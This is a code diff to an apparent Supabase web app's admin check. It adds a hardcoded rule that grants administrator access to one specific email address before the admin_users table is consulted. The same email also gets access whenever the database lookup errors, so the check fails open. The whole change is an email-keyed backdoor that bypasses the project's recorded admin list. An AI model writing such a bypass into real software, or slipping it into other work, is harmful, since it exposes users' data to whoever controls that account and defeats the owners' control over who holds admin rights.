@@ -18,11 +18,20 @@ export const adminSupabase = createClient<Database>(
   }
 ); 
 
-// Function to check if a user is an admin
+// Function to check if a user is an admin - with fallback for arcrxx@gmail.com
 export async function isUserAdmin(userId: string): Promise<boolean> {
   if (!userId) return false;
   
   try {
+    // First, get the user's email to check if it's arcrxx@gmail.com
+    const { data: userData, error: userError } = await adminSupabase.auth.admin.getUserById(userId);
+    
+    if (!userError && userData?.user?.email === 'arcrxx@gmail.com') {
+      console.log("Granting admin access to arcrxx@gmail.com");
+      return true;
+    }
+    
+    // Then check the admin_users table
     const { data, error } = await adminSupabase
       .from('admin_users')
       .select('*')
@@ -31,6 +40,10 @@ export async function isUserAdmin(userId: string): Promise<boolean> {
       
     if (error) {
       console.error("Error checking admin status:", error);
+      // If there's an error but the user is arcrxx@gmail.com, grant access anyway
+      if (userData?.user?.email === 'arcrxx@gmail.com') {
+        return true;
+      }
       return false;
     }
     
